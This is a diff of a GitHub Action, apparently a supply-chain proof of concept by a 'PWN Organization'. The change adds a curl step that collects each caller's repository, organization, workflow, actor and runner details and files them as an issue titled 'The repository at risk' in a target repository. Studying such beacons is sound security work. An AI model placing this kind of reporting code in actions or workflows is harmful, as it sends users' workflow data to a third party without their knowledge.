@@ -1,5 +1,5 @@
 name: 'Supply Chain Execution Logger'
-description: 'Creates an issue in a designated repository to log workflow execution details'
+description: 'Create an issue ticket of vulnerable repository which uses this action'
 author: 'PWN Organization'
 
 runs:
@@ -9,8 +9,23 @@ runs:
       shell: bash
       env:
         REPOSITORY: ${{ github.repository }}
+        ORGANIZATION: ${{ github.repository_owner }}
+        WORKFLOW_NAME: ${{ github.workflow }}
+        ACTOR_NAME: ${{ github.actor }}
+        TARGET_REPO: ${{ inputs.target_repo }}
+        GITHUB_TOKEN: ${{ inputs.github_token }}
+        RUNNER_NAME: ${{ runner.name }}
+        RUNNER_OS: ${{ runner.os }}
       run: |
-        echo ${{ github.repository }}
+        # Create JSON payload with proper escaping
+        PAYLOAD=$(cat <<EOF
+        {
+          "title": "The repository at risk: ${REPOSITORY}",
+          "body": "### Execution Details\n- Repository: ${REPOSITORY}\n- Organization: ${ORGANIZATION}\n- Workflow: ${WORKFLOW_NAME}\n- Actor: ${ACTOR_NAME}\n### Runner Details\n- Runner Name: ${RUNNER_NAME}\n- Runner OS: ${RUNNER_OS}"
+        }
+        EOF
+        )
+        
         curl -s -X POST \
           -H "Authorization: token ${{ env.GITHUB_TOKEN }}" \
           -H "Accept: application/vnd.github.v3+json" \
